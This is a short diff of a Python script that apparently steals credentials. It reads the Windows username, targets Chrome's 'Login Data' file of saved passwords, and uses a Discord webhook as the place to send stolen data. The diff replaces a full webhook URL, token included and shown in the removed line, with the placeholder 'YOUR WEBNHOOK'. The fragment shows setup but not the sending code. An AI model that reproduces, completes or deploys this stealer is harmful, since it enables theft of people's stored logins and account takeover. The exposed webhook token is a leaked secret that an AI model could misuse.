@@ -2,7 +2,7 @@ import requests
 import os
 
 user = os.getlogin()
-webhook_url = "https://discord.com/api/webhooks/1176222023492579449/BWJaN82WQuCUsUM1GA2a7oIp2iluHdcpyKd2zgnzu9O4HdSmrQK9y8q7p4bC7TLfF7Q-"
+webhook_url = "YOUR WEBNHOOK"
 txt_file_path = r"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 
 try:
